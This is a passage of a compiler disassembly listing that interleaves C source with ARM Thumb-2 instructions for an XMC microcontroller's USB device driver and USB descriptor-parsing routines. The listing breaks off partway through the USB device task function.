XMC_USBD_STATUS_t XMC_USBD_EndpointUnconfigure(const uint8_t ep_addr) 
{
 8005e64:	b580      	push	{r7, lr}
 8005e66:	b088      	sub	sp, #32
 8005e68:	af00      	add	r7, sp, #0
 8005e6a:	4603      	mov	r3, r0
 8005e6c:	71fb      	strb	r3, [r7, #7]
  XMC_USBD_EP_t *ep = &xmc_device.ep[ep_addr & (uint8_t)XMC_USBD_ENDPOINT_NUMBER_MASK];
 8005e6e:	79fb      	ldrb	r3, [r7, #7]
 8005e70:	f003 030f 	and.w	r3, r3, #15
 8005e74:	2234      	movs	r2, #52	; 0x34
 8005e76:	fb02 f303 	mul.w	r3, r2, r3
 8005e7a:	4a54      	ldr	r2, [pc, #336]	; (8005fcc <XMC_USBD_EndpointUnconfigure+0x168>)
 8005e7c:	4413      	add	r3, r2
 8005e7e:	61bb      	str	r3, [r7, #24]
  depctl_data_t data;
	daint_data_t daintmsk;
	XMC_USBD_STATUS_t result;
	uint32_t number_temp;
  data.d32 = 0U;  
 8005e80:	2300      	movs	r3, #0
 8005e82:	613b      	str	r3, [r7, #16]
  daintmsk.d32 = xmc_device.device_register->daintmsk;  
 8005e84:	4b51      	ldr	r3, [pc, #324]	; (8005fcc <XMC_USBD_EndpointUnconfigure+0x168>)
 8005e86:	f8d3 31a4 	ldr.w	r3, [r3, #420]	; 0x1a4
 8005e8a:	69db      	ldr	r3, [r3, #28]
 8005e8c:	60fb      	str	r3, [r7, #12]
  number_temp = (uint32_t)((uint32_t)1U << (uint8_t)ep->address_u.address_st.number);
 8005e8e:	69bb      	ldr	r3, [r7, #24]
 8005e90:	781b      	ldrb	r3, [r3, #0]
 8005e92:	f3c3 0303 	ubfx	r3, r3, #0, #4
 8005e96:	b2db      	uxtb	r3, r3
 8005e98:	461a      	mov	r2, r3
 8005e9a:	2301      	movs	r3, #1
 8005e9c:	4093      	lsls	r3, r2
 8005e9e:	617b      	str	r3, [r7, #20]
  /* if not configured return an error */
  if (!ep->isConfigured)
 8005ea0:	69bb      	ldr	r3, [r7, #24]
 8005ea2:	791b      	ldrb	r3, [r3, #4]
 8005ea4:	f003 0304 	and.w	r3, r3, #4
 8005ea8:	b2db      	uxtb	r3, r3
 8005eaa:	2b00      	cmp	r3, #0
 8005eac:	d102      	bne.n	8005eb4 <XMC_USBD_EndpointUnconfigure+0x50>
  {
     result = XMC_USBD_STATUS_ERROR;
 8005eae:	2301      	movs	r3, #1
 8005eb0:	77fb      	strb	r3, [r7, #31]
 8005eb2:	e085      	b.n	8005fc0 <XMC_USBD_EndpointUnconfigure+0x15c>
  }
  else
  {
    /* disable the endpoint, deactivate it and only send naks */
    data.b.usbactep = 0U;
 8005eb4:	7c7b      	ldrb	r3, [r7, #17]
 8005eb6:	f36f 13c7 	bfc	r3, #7, #1
 8005eba:	747b      	strb	r3, [r7, #17]
    data.b.epdis =  1U;
 8005ebc:	7cfb      	ldrb	r3, [r7, #19]
 8005ebe:	f043 0340 	orr.w	r3, r3, #64	; 0x40
 8005ec2:	74fb      	strb	r3, [r7, #19]
    data.b.snak =  1U;
 8005ec4:	7cfb      	ldrb	r3, [r7, #19]
 8005ec6:	f043 0308 	orr.w	r3, r3, #8
 8005eca:	74fb      	strb	r3, [r7, #19]
    data.b.stall =  0U;
 8005ecc:	7cbb      	ldrb	r3, [r7, #18]
 8005ece:	f36f 1345 	bfc	r3, #5, #1
 8005ed2:	74bb      	strb	r3, [r7, #18]
    ep->isConfigured =  0U;
 8005ed4:	69ba      	ldr	r2, [r7, #24]
 8005ed6:	7913      	ldrb	r3, [r2, #4]
 8005ed8:	f36f 0382 	bfc	r3, #2, #1
 8005edc:	7113      	strb	r3, [r2, #4]
    ep->isStalled =  0U;
 8005ede:	69ba      	ldr	r2, [r7, #24]
 8005ee0:	7913      	ldrb	r3, [r2, #4]
 8005ee2:	f36f 1345 	bfc	r3, #5, #1
 8005ee6:	7113      	strb	r3, [r2, #4]
    ep->outInUse =  0U;
 8005ee8:	69ba      	ldr	r2, [r7, #24]
 8005eea:	6853      	ldr	r3, [r2, #4]
 8005eec:	f36f 1304 	bfc	r3, #4, #1
 8005ef0:	6053      	str	r3, [r2, #4]
    ep->inInUse =  0U;
 8005ef2:	69ba      	ldr	r2, [r7, #24]
 8005ef4:	6853      	ldr	r3, [r2, #4]
 8005ef6:	f36f 03c3 	bfc	r3, #3, #1
 8005efa:	6053      	str	r3, [r2, #4]
    /* chose register based on the direction. Control Endpoint need both */
    if ((ep->address_u.address_st.direction == 1U) || (ep->type == (uint8_t)XMC_USBD_ENDPOINT_TYPE_CONTROL))
 8005efc:	69bb      	ldr	r3, [r7, #24]
 8005efe:	781b      	ldrb	r3, [r3, #0]
 8005f00:	f023 037f 	bic.w	r3, r3, #127	; 0x7f
 8005f04:	b2db      	uxtb	r3, r3
 8005f06:	2b00      	cmp	r3, #0
 8005f08:	d106      	bne.n	8005f18 <XMC_USBD_EndpointUnconfigure+0xb4>
 8005f0a:	69bb      	ldr	r3, [r7, #24]
 8005f0c:	791b      	ldrb	r3, [r3, #4]
 8005f0e:	f003 0303 	and.w	r3, r3, #3
 8005f12:	b2db      	uxtb	r3, r3
 8005f14:	2b00      	cmp	r3, #0
 8005f16:	d112      	bne.n	8005f3e <XMC_USBD_EndpointUnconfigure+0xda>
    {
      /* disable endpoint configuration */
      xmc_device.endpoint_in_register[ep->address_u.address_st.number]->diepctl = data.d32;
 8005f18:	69bb      	ldr	r3, [r7, #24]
 8005f1a:	781b      	ldrb	r3, [r3, #0]
 8005f1c:	f3c3 0303 	ubfx	r3, r3, #0, #4
 8005f20:	b2db      	uxtb	r3, r3
 8005f22:	4a2a      	ldr	r2, [pc, #168]	; (8005fcc <XMC_USBD_EndpointUnconfigure+0x168>)
 8005f24:	336a      	adds	r3, #106	; 0x6a
 8005f26:	f852 3023 	ldr.w	r3, [r2, r3, lsl #2]
 8005f2a:	693a      	ldr	r2, [r7, #16]
 8005f2c:	601a      	str	r2, [r3, #0]
      /* disable interrupts */
      daintmsk.ep.in = (uint16_t)((uint32_t)daintmsk.ep.in & (~(uint32_t)number_temp));
 8005f2e:	89ba      	ldrh	r2, [r7, #12]
 8005f30:	697b      	ldr	r3, [r7, #20]
 8005f32:	b29b      	uxth	r3, r3
 8005f34:	43db      	mvns	r3, r3
 8005f36:	b29b      	uxth	r3, r3
 8005f38:	4013      	ands	r3, r2
 8005f3a:	b29b      	uxth	r3, r3
 8005f3c:	81bb      	strh	r3, [r7, #12]
    }
    if ((ep->address_u.address_st.direction == 0U) || (ep->type == (uint8_t)XMC_USBD_ENDPOINT_TYPE_CONTROL))
 8005f3e:	69bb      	ldr	r3, [r7, #24]
 8005f40:	781b      	ldrb	r3, [r3, #0]
 8005f42:	f023 037f 	bic.w	r3, r3, #127	; 0x7f
 8005f46:	b2db      	uxtb	r3, r3
 8005f48:	2b00      	cmp	r3, #0
 8005f4a:	d006      	beq.n	8005f5a <XMC_USBD_EndpointUnconfigure+0xf6>
 8005f4c:	69bb      	ldr	r3, [r7, #24]
 8005f4e:	791b      	ldrb	r3, [r3, #4]
 8005f50:	f003 0303 	and.w	r3, r3, #3
 8005f54:	b2db      	uxtb	r3, r3
 8005f56:	2b00      	cmp	r3, #0
 8005f58:	d123      	bne.n	8005fa2 <XMC_USBD_EndpointUnconfigure+0x13e>
    {
      xmc_device.endpoint_out_register[ep->address_u.address_st.number]->doepctl = data.d32;
 8005f5a:	69bb      	ldr	r3, [r7, #24]
 8005f5c:	781b      	ldrb	r3, [r3, #0]
 8005f5e:	f3c3 0303 	ubfx	r3, r3, #0, #4
 8005f62:	b2db      	uxtb	r3, r3
 8005f64:	4a19      	ldr	r2, [pc, #100]	; (8005fcc <XMC_USBD_EndpointUnconfigure+0x168>)
 8005f66:	3370      	adds	r3, #112	; 0x70
 8005f68:	009b      	lsls	r3, r3, #2
 8005f6a:	4413      	add	r3, r2
 8005f6c:	685b      	ldr	r3, [r3, #4]
 8005f6e:	693a      	ldr	r2, [r7, #16]
 8005f70:	601a      	str	r2, [r3, #0]
      daintmsk.ep.out = (uint16_t)((uint32_t)daintmsk.ep.out & (~(uint32_t)number_temp));
 8005f72:	89fa      	ldrh	r2, [r7, #14]
 8005f74:	697b      	ldr	r3, [r7, #20]
 8005f76:	b29b      	uxth	r3, r3
 8005f78:	43db      	mvns	r3, r3
 8005f7a:	b29b      	uxth	r3, r3
 8005f7c:	4013      	ands	r3, r2
 8005f7e:	b29b      	uxth	r3, r3
 8005f80:	81fb      	strh	r3, [r7, #14]
      if(usbd_init->usbd_transfer_mode == XMC_USBD_USE_FIFO)
 8005f82:	4b13      	ldr	r3, [pc, #76]	; (8005fd0 <XMC_USBD_EndpointUnconfigure+0x16c>)
 8005f84:	681b      	ldr	r3, [r3, #0]
 8005f86:	7b5b      	ldrb	r3, [r3, #13]
 8005f88:	2b01      	cmp	r3, #1
 8005f8a:	d10a      	bne.n	8005fa2 <XMC_USBD_EndpointUnconfigure+0x13e>
      {
        xmc_device.device_register->dtknqr4_fifoemptymsk &= ~number_temp;
 8005f8c:	4b0f      	ldr	r3, [pc, #60]	; (8005fcc <XMC_USBD_EndpointUnconfigure+0x168>)
 8005f8e:	f8d3 31a4 	ldr.w	r3, [r3, #420]	; 0x1a4
 8005f92:	6b59      	ldr	r1, [r3, #52]	; 0x34
 8005f94:	697b      	ldr	r3, [r7, #20]
 8005f96:	43da      	mvns	r2, r3
 8005f98:	4b0c      	ldr	r3, [pc, #48]	; (8005fcc <XMC_USBD_EndpointUnconfigure+0x168>)
 8005f9a:	f8d3 31a4 	ldr.w	r3, [r3, #420]	; 0x1a4
 8005f9e:	400a      	ands	r2, r1
 8005fa0:	635a      	str	r2, [r3, #52]	; 0x34
      }
    }
    xmc_device.device_register->daintmsk = daintmsk.d32;
 8005fa2:	4b0a      	ldr	r3, [pc, #40]	; (8005fcc <XMC_USBD_EndpointUnconfigure+0x168>)
 8005fa4:	f8d3 31a4 	ldr.w	r3, [r3, #420]	; 0x1a4
 8005fa8:	68fa      	ldr	r2, [r7, #12]
 8005faa:	61da      	str	r2, [r3, #28]
    XMC_USBD_lUnassignFifo(ep->txFifoNum); /* free fifo */
 8005fac:	69bb      	ldr	r3, [r7, #24]
 8005fae:	889b      	ldrh	r3, [r3, #4]
 8005fb0:	f3c3 1383 	ubfx	r3, r3, #6, #4
 8005fb4:	b2db      	uxtb	r3, r3
 8005fb6:	4618      	mov	r0, r3
 8005fb8:	f7fe fbde 	bl	8004778 <XMC_USBD_lUnassignFifo>
    result = XMC_USBD_STATUS_OK;
 8005fbc:	2300      	movs	r3, #0
 8005fbe:	77fb      	strb	r3, [r7, #31]
  }
  return result;
 8005fc0:	7ffb      	ldrb	r3, [r7, #31]
}
 8005fc2:	4618      	mov	r0, r3
 8005fc4:	3720      	adds	r7, #32
 8005fc6:	46bd      	mov	sp, r7
 8005fc8:	bd80      	pop	{r7, pc}
 8005fca:	bf00      	nop
 8005fcc:	20000a84 	.word	0x20000a84
 8005fd0:	20000c8c 	.word	0x20000c8c

08005fd4 <XMC_USBD_GetFrameNumber>:

/**
 * Gets the current USB frame number
 **/
uint16_t XMC_USBD_GetFrameNumber(void) 
{
 8005fd4:	b480      	push	{r7}
 8005fd6:	b083      	sub	sp, #12
 8005fd8:	af00      	add	r7, sp, #0
  uint16_t result;
  dsts_data_t dsts;
  dsts.d32 = xmc_device.device_register->dsts;
 8005fda:	4b08      	ldr	r3, [pc, #32]	; (8005ffc <XMC_USBD_GetFrameNumber+0x28>)
 8005fdc:	f8d3 31a4 	ldr.w	r3, [r3, #420]	; 0x1a4
 8005fe0:	689b      	ldr	r3, [r3, #8]
 8005fe2:	603b      	str	r3, [r7, #0]
  result = (uint16_t)dsts.b.soffn;
 8005fe4:	683b      	ldr	r3, [r7, #0]
 8005fe6:	f3c3 230d 	ubfx	r3, r3, #8, #14
 8005fea:	b29b      	uxth	r3, r3
 8005fec:	80fb      	strh	r3, [r7, #6]
  return result;
 8005fee:	88fb      	ldrh	r3, [r7, #6]
}
 8005ff0:	4618      	mov	r0, r3
 8005ff2:	370c      	adds	r7, #12
 8005ff4:	46bd      	mov	sp, r7
 8005ff6:	f85d 7b04 	ldr.w	r7, [sp], #4
 8005ffa:	4770      	bx	lr
 8005ffc:	20000a84 	.word	0x20000a84

08006000 <XMC_USBD_IsEnumDone>:
 * Gets the USB speed enumeration completion status.
 * This should not be used for the actual USB enumeration completion status. For the actual USB enumeration status,
 * the application layer should check for the completion of USB standard request Set configuration.
 **/
uint32_t XMC_USBD_IsEnumDone(void)
{
 8006000:	b480      	push	{r7}
 8006002:	af00      	add	r7, sp, #0
  return (uint32_t)((uint8_t)xmc_device.IsConnected && (uint8_t)xmc_device.IsPowered);
 8006004:	4b0b      	ldr	r3, [pc, #44]	; (8006034 <XMC_USBD_IsEnumDone+0x34>)
 8006006:	f893 31fe 	ldrb.w	r3, [r3, #510]	; 0x1fe
 800600a:	f003 0301 	and.w	r3, r3, #1
 800600e:	b2db      	uxtb	r3, r3
 8006010:	2b00      	cmp	r3, #0
 8006012:	d009      	beq.n	8006028 <XMC_USBD_IsEnumDone+0x28>
 8006014:	4b07      	ldr	r3, [pc, #28]	; (8006034 <XMC_USBD_IsEnumDone+0x34>)
 8006016:	f893 31fe 	ldrb.w	r3, [r3, #510]	; 0x1fe
 800601a:	f003 0304 	and.w	r3, r3, #4
 800601e:	b2db      	uxtb	r3, r3
 8006020:	2b00      	cmp	r3, #0
 8006022:	d001      	beq.n	8006028 <XMC_USBD_IsEnumDone+0x28>
 8006024:	2301      	movs	r3, #1
 8006026:	e000      	b.n	800602a <XMC_USBD_IsEnumDone+0x2a>
 8006028:	2300      	movs	r3, #0
}
 800602a:	4618      	mov	r0, r3
 800602c:	46bd      	mov	sp, r7
 800602e:	f85d 7b04 	ldr.w	r7, [sp], #4
 8006032:	4770      	bx	lr
 8006034:	20000a84 	.word	0x20000a84

08006038 <USB_GetNextDescriptor>:
			 */
			static inline void USB_GetNextDescriptor(uint16_t* const BytesRem,
			                                         void** CurrConfigLoc) ATTR_NON_NULL_PTR_ARG(1) ATTR_NON_NULL_PTR_ARG(2);
			static inline void USB_GetNextDescriptor(uint16_t* const BytesRem,
			                                         void** CurrConfigLoc)
			{
 8006038:	b480      	push	{r7}
 800603a:	b085      	sub	sp, #20
 800603c:	af00      	add	r7, sp, #0
 800603e:	6078      	str	r0, [r7, #4]
 8006040:	6039      	str	r1, [r7, #0]
				uint16_t CurrDescriptorSize = DESCRIPTOR_CAST(*CurrConfigLoc, USB_Descriptor_Header_t).Size;
 8006042:	683b      	ldr	r3, [r7, #0]
 8006044:	681b      	ldr	r3, [r3, #0]
 8006046:	781b      	ldrb	r3, [r3, #0]
 8006048:	81fb      	strh	r3, [r7, #14]

				if (*BytesRem < CurrDescriptorSize)
 800604a:	687b      	ldr	r3, [r7, #4]
 800604c:	881b      	ldrh	r3, [r3, #0]
 800604e:	89fa      	ldrh	r2, [r7, #14]
 8006050:	429a      	cmp	r2, r3
 8006052:	d902      	bls.n	800605a <USB_GetNextDescriptor+0x22>
				  CurrDescriptorSize = *BytesRem;
 8006054:	687b      	ldr	r3, [r7, #4]
 8006056:	881b      	ldrh	r3, [r3, #0]
 8006058:	81fb      	strh	r3, [r7, #14]

				*CurrConfigLoc  = (void*)((uintptr_t)*CurrConfigLoc + CurrDescriptorSize);
 800605a:	683b      	ldr	r3, [r7, #0]
 800605c:	681b      	ldr	r3, [r3, #0]
 800605e:	461a      	mov	r2, r3
 8006060:	89fb      	ldrh	r3, [r7, #14]
 8006062:	4413      	add	r3, r2
 8006064:	461a      	mov	r2, r3
 8006066:	683b      	ldr	r3, [r7, #0]
 8006068:	601a      	str	r2, [r3, #0]
				*BytesRem      -= CurrDescriptorSize;
 800606a:	687b      	ldr	r3, [r7, #4]
 800606c:	881a      	ldrh	r2, [r3, #0]
 800606e:	89fb      	ldrh	r3, [r7, #14]
 8006070:	1ad3      	subs	r3, r2, r3
 8006072:	b29a      	uxth	r2, r3
 8006074:	687b      	ldr	r3, [r7, #4]
 8006076:	801a      	strh	r2, [r3, #0]
			}
 8006078:	bf00      	nop
 800607a:	3714      	adds	r7, #20
 800607c:	46bd      	mov	sp, r7
 800607e:	f85d 7b04 	ldr.w	r7, [sp], #4
 8006082:	4770      	bx	lr

08006084 <USB_GetNextDescriptorOfType>:
#endif

void USB_GetNextDescriptorOfType(uint16_t* const BytesRem,
                                 void** const CurrConfigLoc,
                                 const uint8_t Type)
{
 8006084:	b580      	push	{r7, lr}
 8006086:	b084      	sub	sp, #16
 8006088:	af00      	add	r7, sp, #0
 800608a:	60f8      	str	r0, [r7, #12]
 800608c:	60b9      	str	r1, [r7, #8]
 800608e:	4613      	mov	r3, r2
 8006090:	71fb      	strb	r3, [r7, #7]
    while (*BytesRem)
 8006092:	e009      	b.n	80060a8 <USB_GetNextDescriptorOfType+0x24>
    {
        USB_GetNextDescriptor(BytesRem, CurrConfigLoc);
 8006094:	68b9      	ldr	r1, [r7, #8]
 8006096:	68f8      	ldr	r0, [r7, #12]
 8006098:	f7ff ffce 	bl	8006038 <USB_GetNextDescriptor>

        if (DESCRIPTOR_TYPE(*CurrConfigLoc) == Type)
 800609c:	68bb      	ldr	r3, [r7, #8]
 800609e:	681b      	ldr	r3, [r3, #0]
 80060a0:	785b      	ldrb	r3, [r3, #1]
 80060a2:	79fa      	ldrb	r2, [r7, #7]
 80060a4:	429a      	cmp	r2, r3
 80060a6:	d004      	beq.n	80060b2 <USB_GetNextDescriptorOfType+0x2e>
    while (*BytesRem)
 80060a8:	68fb      	ldr	r3, [r7, #12]
 80060aa:	881b      	ldrh	r3, [r3, #0]
 80060ac:	2b00      	cmp	r3, #0
 80060ae:	d1f1      	bne.n	8006094 <USB_GetNextDescriptorOfType+0x10>
 80060b0:	e000      	b.n	80060b4 <USB_GetNextDescriptorOfType+0x30>
          return;
 80060b2:	bf00      	nop
    }
}
 80060b4:	3710      	adds	r7, #16
 80060b6:	46bd      	mov	sp, r7
 80060b8:	bd80      	pop	{r7, pc}

080060ba <USB_GetNextDescriptorOfTypeBefore>:

void USB_GetNextDescriptorOfTypeBefore(uint16_t* const BytesRem,
                                       void** const CurrConfigLoc,
                                       const uint8_t Type,
                                       const uint8_t BeforeType)
{
 80060ba:	b580      	push	{r7, lr}
 80060bc:	b084      	sub	sp, #16
 80060be:	af00      	add	r7, sp, #0
 80060c0:	60f8      	str	r0, [r7, #12]
 80060c2:	60b9      	str	r1, [r7, #8]
 80060c4:	4611      	mov	r1, r2
 80060c6:	461a      	mov	r2, r3
 80060c8:	460b      	mov	r3, r1
 80060ca:	71fb      	strb	r3, [r7, #7]
 80060cc:	4613      	mov	r3, r2
 80060ce:	71bb      	strb	r3, [r7, #6]
    while (*BytesRem)
 80060d0:	e013      	b.n	80060fa <USB_GetNextDescriptorOfTypeBefore+0x40>
    {
        USB_GetNextDescriptor(BytesRem, CurrConfigLoc);
 80060d2:	68b9      	ldr	r1, [r7, #8]
 80060d4:	68f8      	ldr	r0, [r7, #12]
 80060d6:	f7ff ffaf 	bl	8006038 <USB_GetNextDescriptor>

        if (DESCRIPTOR_TYPE(*CurrConfigLoc) == Type)
 80060da:	68bb      	ldr	r3, [r7, #8]
 80060dc:	681b      	ldr	r3, [r3, #0]
 80060de:	785b      	ldrb	r3, [r3, #1]
 80060e0:	79fa      	ldrb	r2, [r7, #7]
 80060e2:	429a      	cmp	r2, r3
 80060e4:	d00e      	beq.n	8006104 <USB_GetNextDescriptorOfTypeBefore+0x4a>
        {
            return;
        }
        else if (DESCRIPTOR_TYPE(*CurrConfigLoc) == BeforeType)
 80060e6:	68bb      	ldr	r3, [r7, #8]
 80060e8:	681b      	ldr	r3, [r3, #0]
 80060ea:	785b      	ldrb	r3, [r3, #1]
 80060ec:	79ba      	ldrb	r2, [r7, #6]
 80060ee:	429a      	cmp	r2, r3
 80060f0:	d103      	bne.n	80060fa <USB_GetNextDescriptorOfTypeBefore+0x40>
        {
            *BytesRem = 0;
 80060f2:	68fb      	ldr	r3, [r7, #12]
 80060f4:	2200      	movs	r2, #0
 80060f6:	801a      	strh	r2, [r3, #0]
            return;
 80060f8:	e005      	b.n	8006106 <USB_GetNextDescriptorOfTypeBefore+0x4c>
    while (*BytesRem)
 80060fa:	68fb      	ldr	r3, [r7, #12]
 80060fc:	881b      	ldrh	r3, [r3, #0]
 80060fe:	2b00      	cmp	r3, #0
 8006100:	d1e7      	bne.n	80060d2 <USB_GetNextDescriptorOfTypeBefore+0x18>
 8006102:	e000      	b.n	8006106 <USB_GetNextDescriptorOfTypeBefore+0x4c>
            return;
 8006104:	bf00      	nop
        }
    }
}
 8006106:	3710      	adds	r7, #16
 8006108:	46bd      	mov	sp, r7
 800610a:	bd80      	pop	{r7, pc}

0800610c <USB_GetNextDescriptorOfTypeAfter>:

void USB_GetNextDescriptorOfTypeAfter(uint16_t* const BytesRem,
                                      void** const CurrConfigLoc,
                                      const uint8_t Type,
                                      const uint8_t AfterType)
{
 800610c:	b580      	push	{r7, lr}
 800610e:	b084      	sub	sp, #16
 8006110:	af00      	add	r7, sp, #0
 8006112:	60f8      	str	r0, [r7, #12]
 8006114:	60b9      	str	r1, [r7, #8]
 8006116:	4611      	mov	r1, r2
 8006118:	461a      	mov	r2, r3
 800611a:	460b      	mov	r3, r1
 800611c:	71fb      	strb	r3, [r7, #7]
 800611e:	4613      	mov	r3, r2
 8006120:	71bb      	strb	r3, [r7, #6]
    USB_GetNextDescriptorOfType(BytesRem, CurrConfigLoc, AfterType);
 8006122:	79bb      	ldrb	r3, [r7, #6]
 8006124:	461a      	mov	r2, r3
 8006126:	68b9      	ldr	r1, [r7, #8]
 8006128:	68f8      	ldr	r0, [r7, #12]
 800612a:	f7ff ffab 	bl	8006084 <USB_GetNextDescriptorOfType>

    if (*BytesRem)
 800612e:	68fb      	ldr	r3, [r7, #12]
 8006130:	881b      	ldrh	r3, [r3, #0]
 8006132:	2b00      	cmp	r3, #0
 8006134:	d005      	beq.n	8006142 <USB_GetNextDescriptorOfTypeAfter+0x36>
      USB_GetNextDescriptorOfType(BytesRem, CurrConfigLoc, Type);
 8006136:	79fb      	ldrb	r3, [r7, #7]
 8006138:	461a      	mov	r2, r3
 800613a:	68b9      	ldr	r1, [r7, #8]
 800613c:	68f8      	ldr	r0, [r7, #12]
 800613e:	f7ff ffa1 	bl	8006084 <USB_GetNextDescriptorOfType>
}
 8006142:	bf00      	nop
 8006144:	3710      	adds	r7, #16
 8006146:	46bd      	mov	sp, r7
 8006148:	bd80      	pop	{r7, pc}

0800614a <USB_GetNextDescriptorComp>:

uint8_t USB_GetNextDescriptorComp(uint16_t* const BytesRem,
                                  void** const CurrConfigLoc,
                                  ConfigComparatorPtr_t const ComparatorRoutine)
{
 800614a:	b580      	push	{r7, lr}
 800614c:	b086      	sub	sp, #24
 800614e:	af00      	add	r7, sp, #0
 8006150:	60f8      	str	r0, [r7, #12]
 8006152:	60b9      	str	r1, [r7, #8]
 8006154:	607a      	str	r2, [r7, #4]
    uint8_t ErrorCode;

    while (*BytesRem)
 8006156:	e01e      	b.n	8006196 <USB_GetNextDescriptorComp+0x4c>
    {
        uint8_t* PrevDescLoc  = *CurrConfigLoc;
 8006158:	68bb      	ldr	r3, [r7, #8]
 800615a:	681b      	ldr	r3, [r3, #0]
 800615c:	617b      	str	r3, [r7, #20]
        uint16_t PrevBytesRem = *BytesRem;
 800615e:	68fb      	ldr	r3, [r7, #12]
 8006160:	881b      	ldrh	r3, [r3, #0]
 8006162:	827b      	strh	r3, [r7, #18]

        USB_GetNextDescriptor(BytesRem, CurrConfigLoc);
 8006164:	68b9      	ldr	r1, [r7, #8]
 8006166:	68f8      	ldr	r0, [r7, #12]
 8006168:	f7ff ff66 	bl	8006038 <USB_GetNextDescriptor>

        if ((ErrorCode = ComparatorRoutine(*CurrConfigLoc)) != DESCRIPTOR_SEARCH_NotFound)
 800616c:	68bb      	ldr	r3, [r7, #8]
 800616e:	681a      	ldr	r2, [r3, #0]
 8006170:	687b      	ldr	r3, [r7, #4]
 8006172:	4610      	mov	r0, r2
 8006174:	4798      	blx	r3
 8006176:	4603      	mov	r3, r0
 8006178:	747b      	strb	r3, [r7, #17]
 800617a:	7c7b      	ldrb	r3, [r7, #17]
 800617c:	2b02      	cmp	r3, #2
 800617e:	d00a      	beq.n	8006196 <USB_GetNextDescriptorComp+0x4c>
        {
            if (ErrorCode == DESCRIPTOR_SEARCH_Fail)
 8006180:	7c7b      	ldrb	r3, [r7, #17]
 8006182:	2b01      	cmp	r3, #1
 8006184:	d105      	bne.n	8006192 <USB_GetNextDescriptorComp+0x48>
            {
                *CurrConfigLoc = PrevDescLoc;
 8006186:	68bb      	ldr	r3, [r7, #8]
 8006188:	697a      	ldr	r2, [r7, #20]
 800618a:	601a      	str	r2, [r3, #0]
                *BytesRem      = PrevBytesRem;
 800618c:	68fb      	ldr	r3, [r7, #12]
 800618e:	8a7a      	ldrh	r2, [r7, #18]
 8006190:	801a      	strh	r2, [r3, #0]
            }

            return ErrorCode;
 8006192:	7c7b      	ldrb	r3, [r7, #17]
 8006194:	e004      	b.n	80061a0 <USB_GetNextDescriptorComp+0x56>
    while (*BytesRem)
 8006196:	68fb      	ldr	r3, [r7, #12]
 8006198:	881b      	ldrh	r3, [r3, #0]
 800619a:	2b00      	cmp	r3, #0
 800619c:	d1dc      	bne.n	8006158 <USB_GetNextDescriptorComp+0xe>
        }
    }

    return DESCRIPTOR_SEARCH_COMP_EndOfDescriptor;
 800619e:	2302      	movs	r3, #2
}
 80061a0:	4618      	mov	r0, r3
 80061a2:	3718      	adds	r7, #24
 80061a4:	46bd      	mov	sp, r7
 80061a6:	bd80      	pop	{r7, pc}

080061a8 <USB_USBTask>:
#if defined(USB_CAN_BE_DEVICE) && !defined(DEVICE_STATE_AS_GPIOR)
volatile uint8_t     USB_DeviceState;
#endif

void USB_USBTask(void)
{
 80061a8:	b580      	push	{r7, lr}
 80061aa:	af00      	add	r7, sp, #0
		else if (USB_CurrentMode == USB_MODE_Host)
		  USB_HostTask();
	#elif defined(USB_CAN_BE_HOST)
		USB_HostTask();
	#elif defined(USB_CAN_BE_DEVICE)
		USB_DeviceTask();
 80061ac:	f000 f802 	bl	80061b4 <USB_DeviceTask>
	#endif
}
 80061b0:	bf00      	nop
 80061b2:	bd80      	pop	{r7, pc}

080061b4 <USB_DeviceTask>:

#if defined(USB_CAN_BE_DEVICE)
static void USB_DeviceTask(void)
{
 80061b4:	b580      	push	{r7, lr}
 80061b6:	b082      	sub	sp, #8
 80061b8:	af00      	add	r7, sp, #0
	if (USB_DeviceState == DEVICE_STATE_Unattached)
 80061ba:	4b1d      	ldr	r3, [pc, #116]	; (8006230 <USB_DeviceTask+0x7c>)
 80061bc:	781b      	ldrb	r3, [r3, #0]
 80061be:	b2db      	uxtb	r3, r3
 80061c0:	2b00      	cmp	r3, #0
 80061c2:	d031      	beq.n	8006228 <USB_DeviceTask+0x74>
		return device.CurrentDirection | device.CurrentEndpoint;
 80061c4:	4b1b      	ldr	r3, [pc, #108]	; (8006234 <USB_DeviceTask+0x80>)
 80061c6:	f893 213d 	ldrb.w	r2, [r3, #317]	; 0x13d
 80061ca:	4b1a      	ldr	r3, [pc, #104]	; (8006234 <USB_DeviceTask+0x80>)
 80061cc:	f893 313c 	ldrb.w	r3, [r3, #316]	; 0x13c
 80061d0:	4313      	orrs	r3, r2
 80061d2:	b2db      	uxtb	r3, r3
	  return;

	uint8_t PrevEndpoint = Endpoint_GetCurrentEndpoint();
 80061d4:	71fb      	strb	r3, [r7, #7]
		device.CurrentEndpoint = Address & ENDPOINT_EPNUM_MASK;
 80061d6:	2200      	movs	r2, #0
 80061d8:	4b16      	ldr	r3, [pc, #88]	; (8006234 <USB_DeviceTask+0x80>)
 80061da:	f883 213c 	strb.w	r2, [r3, #316]	; 0x13c
		device.CurrentDirection = (Address & ENDPOINT_DIR_MASK);
 80061de:	2200      	movs	r2, #0
 80061e0:	4b14      	ldr	r3, [pc, #80]	; (8006234 <USB_DeviceTask+0x80>)
 80061e2:	f883 213d 	strb.w	r2, [r3, #317]	; 0x13d
	}
 80061e6:	bf00      	nop
		return device.IsSetupRecieved;
 80061e8:	4b12      	ldr	r3, [pc, #72]	; (8006234 <USB_DeviceTask+0x80>)
 80061ea:	f893 313e 	ldrb.w	r3, [r3, #318]	; 0x13e
 80061ee:	f3c3 0340 	ubfx	r3, r3, #1, #1
 80061f2:	b2db      	uxtb	r3, r3
 80061f4:	2b00      	cmp	r3, #0
 80061f6:	bf14      	ite	ne
 80061f8:	2301      	movne	r3, #1
 80061fa:	2300      	moveq	r3, #0
 80061fc:	b2db      	uxtb	r3, r3

	Endpoint_SelectEndpoint(ENDPOINT_CONTROLEP);

	if (Endpoint_IsSETUPReceived())
 80061fe:	2b00      	cmp	r3, #0
 8006200:	d001      	beq.n	8006206 <USB_DeviceTask+0x52>
	  USB_Device_ProcessControlRequest();
 8006202:	f7fd fbc1 	bl	8003988 <USB_Device_ProcessControlRequest>
 8006206:	79fb      	ldrb	r3, [r7, #7]
 8006208:	71bb      	strb	r3, [r7, #6]
		device.CurrentEndpoint = Address & ENDPOINT_EPNUM_MASK;
 800620a:	79bb      	ldrb	r3, [r7, #6]
 800620c:	f003 030f 	and.w	r3, r3, #15
 8006210:	b2da      	uxtb	r2, r3
 8006212:	4b08      	ldr	r3, [pc, #32]	; (8006234 <USB_DeviceTask+0x80>)
 8006214:	f883 213c 	strb.w	r2, [r3, #316]	; 0x13c
		device.CurrentDirection = (Address & ENDPOINT_DIR_MASK);
 8006218:	79bb      	ldrb	r3, [r7, #6]
